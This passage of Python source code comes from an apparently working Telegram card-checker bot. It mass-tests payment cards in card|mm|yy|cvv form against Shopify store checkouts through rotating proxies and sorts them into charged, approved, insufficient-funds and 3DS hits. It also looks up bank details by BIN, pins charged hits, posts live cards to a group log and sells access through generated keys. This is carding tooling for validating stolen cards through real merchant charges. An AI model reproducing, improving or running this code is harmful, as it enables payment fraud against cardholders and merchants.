        failed_sites.add(shop_url)

        low = last_err.lower()
        if '429' in low or 'rate limit' in low or 'too many' in low:
            await asyncio.sleep(1.5)
        elif _is_proxy_err(last_err):
            await asyncio.sleep(0.5)
        else:
            await asyncio.sleep(0.2)

    _log_error_card(card, last_err)
    return _make_result(card, 'Dead', last_err)

def clear_error_log():
    try:
        open("error.txt", 'w').close()
    except Exception:
        pass

def _log_error_card(card: str, reason: str):
    try:
        with open("error.txt", 'a', encoding='utf-8') as f:
            f.write(f"{card}  # {(reason or '')[:100]}\n")
    except Exception:
        pass

def _proxy_to_url(proxy: str) -> str:
    p = (proxy or '').strip()
    if not p:
        return ''
    if p.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
        return p
    parts = p.split(':')
    if len(parts) == 2:
        return f'http://{p}'
    if len(parts) >= 4:
        host, port = parts[0], parts[1]
        rest       = ':'.join(parts[2:])
        mid        = rest.rfind(':')
        user_part  = rest[:mid]
        pw_part    = rest[mid+1:]
        return f'http://{user_part}:{pw_part}@{host}:{port}'
    return f'http://{p}'

async def test_proxy(proxy: str) -> dict:
    proxy_url = _proxy_to_url(proxy)
    test_urls = ['http://httpbin.org/ip', 'http://api.ipify.org', 'http://icanhazip.com']
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        conn    = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(timeout=timeout, connector=conn) as s:
            for url in test_urls:
                try:
                    async with s.get(url, proxy=proxy_url, allow_redirects=True) as r:
                        if r.status == 200:
                            return {'proxy': proxy, 'status': 'alive'}
                except Exception:
                    continue
        return {'proxy': proxy, 'status': 'dead'}
    except Exception:
        return {'proxy': proxy, 'status': 'dead'}

async def test_proxy_async(p: dict):
    try:
        url = p.get('proxy_url') or ''
        if not url:
            return None
        timeout = aiohttp.ClientTimeout(total=12)
        conn = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(timeout=timeout, connector=conn) as s:
            async with s.get('http://api.ipify.org', proxy=url, allow_redirects=True) as r:
                if r.status == 200:
                    return p
    except Exception:
        pass
    return None

def _proxy_url_to_raw(p: dict) -> str:
    ip = p.get('ip') or ''
    port = p.get('port') or ''
    user = p.get('username') or ''
    pw = p.get('password') or ''
    if not ip or not port:
        return ''
    if user and pw:
        return f"{user}:{pw}@{ip}:{port}"
    return f"{ip}:{port}"

async def get_proxy_ip(proxy: str):
    proxy_url = _proxy_to_url(proxy)
    if proxy_url.startswith('socks'):
        return None
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as s:
            async with s.get('https://api.ipify.org', proxy=proxy_url) as r:
                if r.status == 200:
                    return (await r.text()).strip()
    except Exception:
        pass
    return None


# ════════════════════════════════════════════════════════════
#  KEY SYSTEM
# ════════════════════════════════════════════════════════════
_keys_cache: dict = {}

def _load_keys() -> dict:
    global _keys_cache
    if os.path.exists(KEYS_FILE):
        try:
            with open(KEYS_FILE, 'r', encoding='utf-8') as f:
                _keys_cache = json.load(f)
        except Exception:
            _keys_cache = {}
    return _keys_cache

def _save_keys():
    try:
        with open(KEYS_FILE, 'w', encoding='utf-8') as f:
            json.dump(_keys_cache, f, indent=2)
    except Exception:
        pass

def _gen_key_code() -> str:
    import secrets, string
    alphabet = string.ascii_uppercase + string.digits
    suffix = ''.join(secrets.choice(alphabet) for _ in range(6))
    return f"THE-HITTER-{suffix}"

def _grant_access(uid: int, hours: int, via_key: str, username: str = '', first_name: str = ''):
    now = int(time.time())
    expires = now + int(hours) * 3600
    rec = _users_access.get(str(uid), {})
    rec.update({
        'granted_at': now,
        'expires_at': expires,
        'via':        via_key,
    })
    if username:
        rec['username'] = username
    if first_name:
        rec['first_name'] = first_name
    _users_access[str(uid)] = rec
    _save_users_access()

_load_keys()


# ════════════════════════════════════════════════════════════
#  GC HIT LOG
# ════════════════════════════════════════════════════════════
def _build_gc_log(result: dict, checker_name: str) -> str:
    status   = result.get('status', 'Dead')
    msg      = (result.get('message', '') or '')
    amount   = _fmt_price(result.get('price', '-'))
    gateway  = result.get('gateway', 'Shopify Payments')

    low = msg.lower()
    if status == 'Charged':
        header = "Charged Success"
    elif 'insufficient' in low:
        header = "Live Card"
    else:
        header = "Hit"

    pretty_msg = _clean_response(msg)
    if 'insufficient' in low:
        pretty_msg = 'Insufficient Funds — Card Live'

    return pe(
        f"[⌯] {_sb(header)} ⌁ ⚡\n"
        f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
        f"[⌯] {_sb('Response')} ⌁ {_sb(pretty_msg)} ⚡\n"
        f"[⌯] {_sb('Amount')} ⌁ {_sb(amount)} ⚡\n"
        f"[⌯] {_sb('Gate')} ⌁ {_sb(gateway)}\n"
        f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
        f"[⌯] {_sb('Checker')} ⌁ 🎯 {checker_name}"
    )

def _should_post_to_gc(result: dict) -> bool:
    status = result.get('status', '')
    msg    = (result.get('message', '') or '').lower()
    if status == 'Charged':
        return True
    if 'insufficient' in msg:
        return True
    return False


# ════════════════════════════════════════════════════════════
#  KEYBOARDS + BOT-API HELPERS
# ════════════════════════════════════════════════════════════
_BTN_STYLES = ["primary", "success", "danger"]
_style_idx  = 0
_style_lock = threading.Lock()

def _next_style() -> str:
    global _style_idx
    with _style_lock:
        s = _BTN_STYLES[_style_idx % len(_BTN_STYLES)]
        _style_idx += 1
        return s

def _color_kb(rows: list) -> dict:
    colored = []
    for row in rows:
        colored_row = []
        for btn in row:
            b = dict(btn)
            cb       = b.get("callback_data", "")
            has_copy = "copy_text" in b
            has_url  = "url" in b
            if ((cb and cb != "noop") or has_copy or has_url) and "style" not in b:
                b["style"] = _next_style()
            if cb == "noop" and has_copy:
                b.pop("callback_data", None)
            raw_text = b.get("text", "")
            if "icon_custom_emoji_id" not in b:
                icon_id = _btn_icon_id(raw_text)
                if icon_id:
                    b["icon_custom_emoji_id"] = icon_id
            b["text"] = _clean_btn_text(raw_text)
            colored_row.append(b)
        colored.append(colored_row)
    return {"inline_keyboard": colored}

def _strip_styles(markup: dict) -> dict:
    import copy
    m = copy.deepcopy(markup)
    for row in m.get("inline_keyboard", []):
        for btn in row:
            btn.pop("style", None)
    return m

def _strip_icons(markup: dict) -> dict:
    import copy
    m = copy.deepcopy(markup)
    for row in m.get("inline_keyboard", []):
        for btn in row:
            btn.pop("icon_custom_emoji_id", None)
    return m

_http_session = requests.Session()
_http_session.verify = False
_http_adapter = requests.adapters.HTTPAdapter(
    pool_connections=8, pool_maxsize=32, max_retries=1
)
_http_session.mount("https://", _http_adapter)
_http_session.mount("http://",  _http_adapter)

def _raw_post(url, payload):
    p = dict(payload)
    if "reply_markup" in p and isinstance(p["reply_markup"], dict):
        p["reply_markup"] = json.dumps(p["reply_markup"], ensure_ascii=False)
    try:
        return _http_session.post(url, json=p, timeout=8).json()
    except Exception:
        return {"ok": False}

async def raw_send(chat_id, text, kb_rows, parse_mode="HTML", reply_to=None):
    kb  = _color_kb(kb_rows)
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": chat_id, "text": text,
        "parse_mode": parse_mode, "reply_markup": kb,
        "disable_web_page_preview": True,
    }
    if reply_to:
        payload["reply_to_message_id"] = reply_to
    resp = await asyncio.to_thread(_raw_post, url, payload)
    if resp.get("ok"):
        return resp["result"]["message_id"]
    payload["reply_markup"] = _strip_icons(kb)
    resp = await asyncio.to_thread(_raw_post, url, payload)
    if resp.get("ok"):
        return resp["result"]["message_id"]
    payload["reply_markup"] = _strip_styles(_strip_icons(kb))
    resp = await asyncio.to_thread(_raw_post, url, payload)
    if resp.get("ok"):
        return resp["result"]["message_id"]
    return None

async def raw_edit(chat_id, message_id, text, kb_rows, parse_mode="HTML"):
    kb  = _color_kb(kb_rows)
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
    payload = {
        "chat_id": chat_id, "message_id": message_id,
        "text": text, "parse_mode": parse_mode, "reply_markup": kb,
        "disable_web_page_preview": True,
    }
    resp = await asyncio.to_thread(_raw_post, url, payload)
    if resp.get("ok"):
        return resp
    payload["reply_markup"] = _strip_icons(kb)
    resp = await asyncio.to_thread(_raw_post, url, payload)
    if resp.get("ok"):
        return resp
    payload["reply_markup"] = _strip_styles(_strip_icons(kb))
    resp = await asyncio.to_thread(_raw_post, url, payload)
    return resp

async def nav_edit(chat_id, message_id, text, kb_rows, parse_mode="HTML"):
    kb = _color_kb(kb_rows)
    cap_payload = {
        "chat_id": chat_id, "message_id": message_id,
        "caption": text, "parse_mode": parse_mode, "reply_markup": kb,
    }
    resp = await asyncio.to_thread(
        _raw_post,
        f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageCaption",
        cap_payload,
    )
    if resp.get("ok"):
        return resp
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
    txt_payload = {
        "chat_id": chat_id, "message_id": message_id,
        "text": text, "parse_mode": parse_mode, "reply_markup": kb,
        "disable_web_page_preview": True,
    }
    resp = await asyncio.to_thread(_raw_post, url, txt_payload)
    if resp.get("ok"):
        return resp
    txt_payload["reply_markup"] = _strip_icons(kb)
    resp = await asyncio.to_thread(_raw_post, url, txt_payload)
    if resp.get("ok"):
        return resp
    txt_payload["reply_markup"] = _strip_styles(_strip_icons(kb))
    resp = await asyncio.to_thread(_raw_post, url, txt_payload)
    return resp

def rows_main():
    return [
        [{"text": "💳  Checker",        "callback_data": "gates"}],
        [{"text": "💻  Contact",        "url": f"https://t.me/{OWNER_USERNAME}"},
         {"text": "❌  Close",          "callback_data": "close"}],
    ]

def rows_gates():
    return [
        [{"text": "🔑  Manage Proxy",   "callback_data": "manage_proxy"}],
        [{"text": "↪️  Back",           "callback_data": "back_start"}],
    ]

def rows_proxy(uid: int):
    pool_on    = user_pool_enabled.get(uid, True) if uid else True
    pool_label = "✅  Proxy Pool  ON" if pool_on else "⚡  Proxy Pool  OFF"
    return [
        [{"text": pool_label,           "callback_data": "toggle_pool"}],
        [{"text": "✅  Test Proxy",     "callback_data": "test_proxy_btn"},
         {"text": "❌  Remove Proxy",   "callback_data": "remove_proxy_btn"}],
        [{"text": "↪️  Back",           "callback_data": "gates"}],
    ]

def rows_admin():
    return [
        [{"text": "👑  Users",          "callback_data": "admin_users"},
         {"text": "🌐  Sites",          "callback_data": "admin_sites"}],
        [{"text": "📡  Broadcast",      "callback_data": "admin_broadcast_info"},
         {"text": "⚙️  Proxy Pool",    "callback_data": "admin_proxy_pool"}],
        [{"text": "❌  Close",          "callback_data": "close"}],
    ]

def rows_admin_users():
    return [
        [{"text": "📋  Premium List",   "callback_data": "admin_list_users"}],
        [{"text": "✅  Add User",       "callback_data": "admin_add_user_info"},
         {"text": "❌  Remove User",    "callback_data": "admin_rm_user_info"}],
        [{"text": "↪️  Back",           "callback_data": "admin_panel"}],
    ]

def rows_admin_sites():
    return [
        [{"text": "📋  Site List",      "callback_data": "admin_list_sites_cb"}],
        [{"text": "✅  Add Site",       "callback_data": "admin_add_site_info"},
         {"text": "❌  Remove Site",    "callback_data": "admin_rm_site_info"}],
        [{"text": "↪️  Back",           "callback_data": "admin_panel"}],
    ]

def rows_admin_proxy_pool():
    return [
        [{"text": "📋  View Pool",      "callback_data": "admin_list_proxy_cb"}],
        [{"text": "✅  Add Proxies",    "callback_data": "admin_add_proxy_info"},
         {"text": "🔥  Clear Pool",     "callback_data": "admin_clear_proxy_cb"}],
        [{"text": "↪️  Back",           "callback_data": "admin_panel"}],
    ]

def rows_stop():
    return [[{"text": "✋  Stop",        "callback_data": "stop_mass"}]]

def _send_notification(chat_id, text):
    try:
        r = _raw_post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", {
            "chat_id": chat_id,
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": True,
        })
        if r.get("ok"):
            return r["result"]["message_id"]
    except Exception:
        pass
    return None

def _pin_message_botapi(chat_id, message_id):
    try:
        _raw_post(f"https://api.telegram.org/bot{BOT_TOKEN}/pinChatMessage", {
            "chat_id": chat_id,
            "message_id": message_id,
            "disable_notification": False,
        })
    except Exception:
        pass


# ════════════════════════════════════════════════════════════
#  BOT CORE — A: init, monkeypatches, helpers
# ════════════════════════════════════════════════════════════
import re as _re

bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

active_sessions: dict = {}
pending_checks:  dict = {}

_orig_send_message = bot.send_message
_orig_edit_message = bot.edit_message

def _strip_tg_emoji(text):
    if not text:
        return text
    return _re.sub(r'<tg-emoji[^>]*>([^<]*)</tg-emoji>', r'\1', text)

def _is_doc_invalid(e):
    s = str(e).upper()
    return 'DOCUMENT_INVALID' in s or 'FILE_REFERENCE_INVALID' in s

_orig_tl_edit = _TLMessage.edit

async def _safe_tl_edit(self, *args, **kwargs):
    kwargs.setdefault('link_preview', False)
    try:
        return await _orig_tl_edit(self, *args, **kwargs)
    except Exception as e:
        if _is_doc_invalid(e):
            new_args = list(args)
            if new_args and isinstance(new_args[0], str):
                new_args[0] = _strip_tg_emoji(new_args[0])
            if 'text' in kwargs:
                kwargs['text'] = _strip_tg_emoji(kwargs['text'])
            if 'message' in kwargs and isinstance(kwargs['message'], str):
                kwargs['message'] = _strip_tg_emoji(kwargs['message'])
            return await _orig_tl_edit(self, *new_args, **kwargs)
        raise

_TLMessage.edit = _safe_tl_edit

async def _send_message_no_preview(*args, **kwargs):
    kwargs.setdefault('link_preview', False)
    try:
        return await _orig_send_message(*args, **kwargs)
    except Exception as e:
        if _is_doc_invalid(e):
            if len(args) >= 2 and isinstance(args[1], str):
                args = (args[0], _strip_tg_emoji(args[1])) + args[2:]
            if 'message' in kwargs and isinstance(kwargs['message'], str):
                kwargs['message'] = _strip_tg_emoji(kwargs['message'])
            return await _orig_send_message(*args, **kwargs)
        raise

async def _edit_message_no_preview(*args, **kwargs):
    kwargs.setdefault('link_preview', False)
    try:
        return await _orig_edit_message(*args, **kwargs)
    except Exception as e:
        if _is_doc_invalid(e):
            if len(args) >= 3 and isinstance(args[2], str):
                args = args[:2] + (_strip_tg_emoji(args[2]),) + args[3:]
            if 'text' in kwargs and isinstance(kwargs['text'], str):
                kwargs['text'] = _strip_tg_emoji(kwargs['text'])
            if 'message' in kwargs and isinstance(kwargs['message'], str):
                kwargs['message'] = _strip_tg_emoji(kwargs['message'])
            return await _orig_edit_message(*args, **kwargs)
        raise

bot.send_message = _send_message_no_preview
bot.edit_message = _edit_message_no_preview

async def get_display_name(uid):
    try:
        entity = await bot.get_entity(uid)
        name   = getattr(entity, 'first_name', None) or ''
        lname  = getattr(entity, 'last_name',  None) or ''
        full   = (name + ' ' + lname).strip()
        return full if full else str(uid)
    except:
        return str(uid)

async def get_user_info(uid):
    try:
        entity   = await bot.get_entity(uid)
        name     = getattr(entity, 'first_name', None) or str(uid)
        username = getattr(entity, 'username', None)
        return name, username
    except:
        return str(uid), None

def _is_3ds(msg: str) -> bool:
    m = (msg or '').lower()
    return any(x in m for x in ('3d secure', '3ds', 'authentication required', 'otp required'))

def _is_insuf(msg: str) -> bool:
    return 'insufficient' in (msg or '').lower()

def has_user_proxy(uid: int) -> bool:
    return bool(get_user_proxies(uid))

PROXY_REQUIRED_MSG = pe(
    f"❌ <b>No Proxy Configured</b>\n"
    f"<b>{SEP}</b>\n"
    f"You must set a proxy before using this command.\n"
    f"<b>{SEP}</b>\n"
    f"⚡ <b>Set one:</b>\n"
    f"<code>/setproxy ip:port</code>\n"
    f"<code>/setproxy ip:port:user:pass</code>\n"
    f"<code>/addproxies</code> — reply to a <code>.txt</code> file\n"
    f"<b>{SEP}</b>\n"
    f"{DEV_LINE}"
)


# ════════════════════════════════════════════════════════════
#  BOT CORE — B: hits, progress, results, mass runner
# ════════════════════════════════════════════════════════════
async def _post_gc_log(result: dict, checker_name: str):
    if not HIT_LOG_GC_ID:
        return
    try:
        msg = _build_gc_log(result, checker_name)
        await asyncio.to_thread(_send_notification, HIT_LOG_GC_ID, msg)
    except Exception:
        pass

async def send_realtime_hit(user_id, result, hit_type):
    bin_info           = await get_bin_info(result['card'].split('|')[0])
    result['bin_info'] = bin_info
    name, username     = await get_user_info(user_id)
    checker_name       = name if username else str(user_id)
    msg    = build_result_card(result, bin_info, user_id, checker_name)
    msg_id = await asyncio.to_thread(_send_notification, user_id, msg)
    if msg_id and hit_type == "Charged":
        await asyncio.to_thread(_pin_message_botapi, user_id, msg_id)
    if _should_post_to_gc(result):
        await _post_gc_log(result, checker_name)

async def send_insufficient_log(user_id, result):
    card     = result['card']
    resp_msg = _clean_response(result.get('message', ''))
    name, username = await get_user_info(user_id)
    checker_name   = name if username else str(user_id)
    await bot.send_message(
        user_id,
        pe(
            f"💸 <b>Insufficient Funds</b>\n"
            f"<b>{SEP}</b>\n"
            f"🃏 <b>Card</b>    »  <tg-spoiler>{card}</tg-spoiler>\n"
            f"💬 <b>Reason</b>  »  {resp_msg}\n"
            f"<b>{SEP}</b>\n"
            f"💵 <b>Amount</b>  »  <b>{_fmt_price(result.get('price', '-'))}</b>\n"
            f"<b>{SEP}</b>\n"
            f"{DEV_LINE}"
        ),
        parse_mode='html'
    )
    if _should_post_to_gc(result):
        await _post_gc_log(result, checker_name)

async def send_3ds_log(user_id, result):
    card     = result['card']
    resp_msg = _clean_response(result.get('message', ''))
    name, username = await get_user_info(user_id)
    checker_name   = name if username else str(user_id)
    await bot.send_message(
        user_id,
        pe(
            f"⚠️ <b>3DS Card</b>\n"
            f"<b>{SEP}</b>\n"
            f"🃏 <b>Card</b>    »  <tg-spoiler>{card}</tg-spoiler>\n"
            f"💬 <b>Reason</b>  »  {resp_msg}\n"
            f"<b>{SEP}</b>\n"
            f"{DEV_LINE}"
        ),
        parse_mode='html'
    )

async def update_mass_progress(user_id, message_id, results, checked, last_res=None):
    bar    = make_progress_bar(checked, results['total'])
    latest = ""
    if last_res:
        st    = last_res['status']
        msg_r = last_res.get('message', '') or ''
        if st == 'Charged':
            se = "💎"; label = "CHARGED"
        elif st == 'Approved':
            se = "✅"; label = "APPROVED"
        elif _is_insuf(msg_r):
            se = "💸"; label = "Insufficient"
        elif _is_3ds(msg_r):
            se = "⚠️"; label = "3DS"
        else:
            se = "🚫"; label = "Declined"
        reason = msg_r[:45] if msg_r else label
        t = last_res.get('time')
        t_disp = f"{t}s" if t not in (None, 0, '0') else "—"
        latest = (
            f"\n<b>{SEP}</b>\n"
            f"⚡ <b>Last Result</b>\n"
            f"{se}  <tg-spoiler>{last_res['card']}</tg-spoiler>\n"
            f"💫  {reason}  ·  {t_disp}"
        )
    text = pe(
        f"<b>🔥 Mass Check  —  Running</b>\n"
        f"<b>{SEP}</b>\n"
        f"📋 <b>Total</b>      »  {results['total']}\n"
        f"☄️ <b>Checked</b>   »  {checked}\n"
        f"💎 <b>Charged</b>   »  {len(results['charged'])}\n"
        f"✅ <b>Approved</b>  »  {len(results['approved'])}\n"
        f"⚠️ <b>3DS</b>       »  {len(results.get('tds', []))}\n"
        f"<code>{bar}</code>"
        f"{latest}"
    )
    await raw_edit(user_id, message_id, text, rows_stop())

def _file_row(label, r):
    gate  = r.get('gateway', 'Shopify')
    price = _fmt_price(r.get('price', '-'))
    bi    = r.get('bin_info')
    if bi:
        brand, btype, level, bank, country, flag = bi
        bank_line = f"  Bank    : {bank} | {country} {flag} | {brand} {btype} {level}\n"
    else:
        bank_line = ""
    return (
        f"  [{label}]\n"
        f"  CC      : {r['card']}\n"
        f"  Gateway : {gate}\n"
        f"  Amount  : {price}\n"
        f"  Message : {r.get('message','')[:80]}\n"
        + bank_line +
        f"  {'─'*36}\n"
    )

async def send_final_results(user_id, results):
    elapsed  = int(time.time() - results['start_time'])
    h, m, s  = elapsed // 3600, (elapsed % 3600) // 60, elapsed % 60
    bar      = make_progress_bar(results['total'], results['total'])
    ch_count = len(results['charged'])
    ap_count = len(results['approved'])
    td_count = len(results.get('tds', []))
    cname    = await get_display_name(user_id)
    time_fmt = f"{h}h {m}m {s}s" if h else (f"{m}m {s}s" if m else f"{s}s")
    summary  = pe(
        f"<b>🔥 Mass Check  —  Complete</b>\n"
        f"<b>{SEP}</b>\n"
        f"<blockquote>"
        f"📋 <b>Total</b>      »  {results['total']}\n"
        f"💎 <b>Charged</b>   »  {ch_count}\n"
        f"✅ <b>Approved</b>  »  {ap_count}\n"
        f"⚠️ <b>3DS</b>       »  {td_count}\n"
        f"❌ <b>Dead</b>      »  {len(results.get('dead', []))}\n"
        f"<code>{bar}</code>"
        f"</blockquote>\n"
        f"<b>{SEP}</b>\n"
        f"⏱️ <b>Time</b>  »  {time_fmt}\n"
        f"<b>{SEP}</b>\n"
        f"{checker_line(user_id, cname)}\n"
        f"{DEV_LINE}"
    )
    await bot.send_message(user_id, summary, parse_mode='html')

    if results['charged']:
        D = "─" * 44
        lines = [f"{D}\n  {BOT_BRAND}  ◈  💎 CHARGED HITS\n{D}\n\n"]
        for r in results['charged']:
            lines.append(_file_row("💎 CHARGED", r))
        lines.append(f"\n  Charged  »  {ch_count}\n{D}\n")
        async with aiofiles.open("charged.txt", 'w') as f:
            await f.write("".join(lines))
        await bot.send_file(
            user_id, "charged.txt",
            caption=pe(f"💎 <b>Charged Hits  »  {ch_count}</b>\n{DEV_LINE}"),
            parse_mode='html'
        )
        try: os.remove("charged.txt")
        except: pass

    combo = results['approved'] + results.get('tds', [])
    if combo:
        D = "─" * 44
        lines = [f"{D}\n  {BOT_BRAND}  ◈  HITS FILE\n{D}\n\n"]
        if results['approved']:
            lines.append(f"  ── ✅ APPROVED  ({ap_count}) ────────────────────\n\n")
            for r in results['approved']:
                lines.append(_file_row("✅ APPROVED", r))
        if results.get('tds'):
            lines.append(f"\n  ── ⚠️  3DS  ({td_count}) ──────────────────────\n\n")
            for r in results['tds']:
                lines.append(_file_row("⚠️ 3DS", r))
        lines.append(f"\n{D}\n  Approved: {ap_count}  ·  3DS: {td_count}\n{D}\n")
        async with aiofiles.open("approved.txt", 'w') as f:
            await f.write("".join(lines))
        caption = pe(
            f"✅ <b>Hits File</b>\n"
            f"<b>{SEP}</b>\n"
            f"✅ <b>Approved</b>  »  {ap_count}\n"
            f"⚠️ <b>3DS</b>       »  {td_count}\n"
            f"{DEV_LINE}"
        )
        await bot.send_file(user_id, "approved.txt", caption=caption, parse_mode='html')
        try: os.remove("approved.txt")
        except: pass

    error_path = os.path.join(os.path.dirname(__file__), 'error.txt')
    try:
        async with aiofiles.open(error_path, 'r') as f:
            err_content = await f.read()
        err_lines = [l for l in err_content.strip().splitlines() if l.strip()]
        if err_lines:
            await bot.send_file(
                user_id, error_path,
                caption=pe(
                    f"❌ <b>Failed Cards  »  {len(err_lines)}</b>\n"
                    f"<b>{SEP}</b>\n"
                    f"⚠️ Cards that errored after all retries\n"
                    f"{DEV_LINE}"
                ),
                parse_mode='html'
            )
    except FileNotFoundError:
        pass
    except Exception:
        pass

async def run_mass_check(user_id, cards, progress_msg_id):
    session_key = f"{user_id}_{progress_msg_id}"
    clear_session_bad_sites()
    clear_error_log()
    active_sessions[session_key] = {'paused': False}
    all_results = {
        'charged': [], 'approved': [], 'dead': [], 'tds': [],
        'total': len(cards), 'start_time': time.time(), 'last_card_time': time.time(),
    }
    proxy_pool = list(get_proxies_for_user(user_id) or load_proxies())
    proxy_iter = itertools.cycle(proxy_pool) if proxy_pool else None
    proxy_lock = asyncio.Lock()

    async def _next_proxy():
        if not proxy_iter:
            return None
        async with proxy_lock:
            return next(proxy_iter)

    try:
        queue       = asyncio.Queue()
        last_update = [time.time()]
        for c in cards:
            queue.put_nowait(c)

        async def worker():
            while not queue.empty() and session_key in active_sessions:
                sess = active_sessions.get(session_key)
                if not sess:
                    break
                while sess.get('paused', False):
                    await asyncio.sleep(1)
                    sess = active_sessions.get(session_key)
                    if not sess:
                        return
                try:
                    card = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break
                cur_sites   = get_user_sites(user_id) or get_live_sites()
                start_proxy = await _next_proxy()
                if not cur_sites or not proxy_pool:
                    break
                t0 = time.time()
                result = {'card': card, 'status': 'Dead', 'message': 'Error'}
                try:
                    result = await check_card_with_retry(card, cur_sites, proxy_pool, max_retries=3)
                    result['time'] = round(time.time() - t0, 2)
                    all_results['last_card_time'] = time.time()
                    st    = result.get('status', '')
                    msg_r = result.get('message', '') or ''
                    if st == 'Charged':
                        bin_info = await get_bin_info(card.split('|')[0])
                        result['bin_info'] = bin_info
                        all_results['charged'].append(result)
                        await send_realtime_hit(user_id, result, 'Charged')
                    elif st == 'Approved':
                        bin_info = await get_bin_info(card.split('|')[0])
                        result['bin_info'] = bin_info
                        all_results['approved'].append(result)
                        await send_realtime_hit(user_id, result, 'Approved')
                    elif _is_3ds(msg_r):
                        bin_info = await get_bin_info(card.split('|')[0])
                        result['bin_info'] = bin_info
                        all_results['tds'].append(result)
                        await send_3ds_log(user_id, result)
                    elif _is_insuf(msg_r):
                        bin_info = await get_bin_info(card.split('|')[0])
                        result['bin_info'] = bin_info
                        all_results['approved'].append(result)
                        await send_insufficient_log(user_id, result)
                    else:
                        all_results['dead'].append(result)
                except Exception:
                    all_results['dead'].append(result)

                checked = (len(all_results['charged']) + len(all_results['approved']) +
                           len(all_results['dead']) + len(all_results.get('tds', [])))
                now = time.time()
                if now - last_update[0] >= 3:
                    last_update[0] = now
                    try:
                        await update_mass_progress(user_id, progress_msg_id, all_results, checked, result)
                    except Exception:
                        pass

        workers = [asyncio.create_task(worker()) for _ in range(min(MASS_WORKERS, len(cards)))]
        await asyncio.gather(*workers)

    except Exception:
        pass
    finally:
        active_sessions.pop(session_key, None)
        await send_final_results(user_id, all_results)

def _admin_panel_text():
    pcount  = len(load_premium_users())
    scount  = len(load_sites())
    prcount = len(load_proxies())
    kcount  = len(_keys_cache)
    return pe(
        f"<b>👑 Admin Panel</b>  —  <b>{BOT_BRAND}</b>\n"
        f"<b>{SEP}</b>\n"
        f"<blockquote>"
        f"🟢 <b>Status</b>      »  Online\n"
        f"👤 <b>Users</b>       »  {pcount} trusted\n"
        f"🌐 <b>Sites</b>        »  {scount} loaded\n"
        f"📡 <b>Proxy Pool</b>  »  {prcount} proxies\n"
        f"🔑 <b>Keys</b>         »  {kcount} generated"
        f"</blockquote>\n"
        f"<b>{SEP}</b>\n"
        f"{DEV_LINE}"
    )


# ════════════════════════════════════════════════════════════
#  BOT CORE — C: /command handlers
# ════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    uid      = event.sender_id
    chat_id  = event.chat_id
    in_group = (chat_id != uid)

    if not in_group:
        try:
            rm_msg = await bot.send_message(uid, "\u200b", buttons=Button.clear())
            await asyncio.sleep(0.3)
            await bot.delete_messages(uid, rm_msg.id)
        except Exception:
            pass

    try:
        sender    = await event.get_sender()
        username  = f"@{sender.username}" if sender.username else f"ID:{uid}"
        firstname = sender.first_name or "User"
    except:
        username  = f"ID:{uid}"
        firstname = "User"

    lim = get_user_limit(uid)
    if is_admin(uid):
        status_icon = "👑"; status_line = "Admin"
    elif is_premium(uid):
        status_icon = "✅"; status_line = "Premium"
    else:
        status_icon = "🚫"; status_line = "No Access"

    text = pe(
        f"<b>⚡ Welcome, {firstname}!</b>\n"
        f"<b>{SEP}</b>\n"
        f"<blockquote>"
        f"👤 <b>User</b>     »  {username}\n"
        f"🆔 <b>ID</b>       »  <code>{uid}</code>\n"
        f"{status_icon} <b>Status</b>  »  {status_line}\n"
        f"📋 <b>Limit</b>   »  {lim if lim else '—'} cards/file"
        f"</blockquote>\n"
        f"<b>{SEP}</b>\n"
        f"Select an option below to get started.\n"
        f"<b>{SEP}</b>\n"
        f"{DEV_LINE}"
    )
    dest = chat_id if in_group else uid
    await raw_send(dest, text, rows_main(),
                   reply_to=event.message.id if in_group else None)

@bot.on(events.NewMessage(pattern=r'^/sh\s+'))
async def single_check(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe(
            f"❌ <b>Access Denied</b>\n"
            f"<b>{SEP}</b>\n"
            f"🔒 You need access to use this bot.\n"
            f"Contact the owner to get added.\n"
            f"<b>{SEP}</b>\n"
            f"{DEV_LINE}"
        ), parse_mode='html')
        return

    if not get_user_proxies(uid):
        await event.reply(PROXY_REQUIRED_MSG, parse_mode='html')
        return

    sites   = get_user_sites(uid) or get_live_sites()
    proxies = get_proxies_for_user(uid)
    if not sites:
        await event.reply(pe(f"❌ <b>No Sites Available</b>\n<b>{SEP}</b>\nContact the admin."), parse_mode='html')
        return
    if not proxies:
        await event.reply(pe(f"❌ <b>No Proxy Configured</b>\n<b>{SEP}</b>\n<code>/setproxy ip:port</code>"), parse_mode='html')
        return
    cards = extract_cc(event.message.text.split(' ', 1)[1].strip())
    if not cards:
        await event.reply(pe(f"❌ <b>Invalid Format</b>\n<b>{SEP}</b>\nUsage: <code>/sh card|mm|yy|cvv</code>"), parse_mode='html')
        return
    card = cards[0]
    smsg = await event.reply(pe(
        f"⚡ <b>Checking Card...</b>\n"
        f"<b>{SEP}</b>\n"
        f"🃏 <tg-spoiler><code>{card}</code></tg-spoiler>\n"
        f"<b>{SEP}</b>\n"
        f"⏳ Please wait..."
    ), parse_mode='html')
    try:
        t0 = time.time()
        (result, bin_info), (name, username) = await asyncio.gather(
            asyncio.gather(
                check_card_with_retry(card, sites, proxies, max_retries=3),
                get_bin_info(card.split('|')[0]),
            ),
            get_user_info(uid),
        )
        cname          = name if username else str(uid)
        result['time'] = round(time.time() - t0, 2)
        resp = build_result_card(result, bin_info, uid, cname)
        await raw_edit(uid, smsg.id, resp, [])
        if result.get('status') == 'Charged':
            await asyncio.to_thread(_pin_message_botapi, uid, smsg.id)
        if _should_post_to_gc(result):
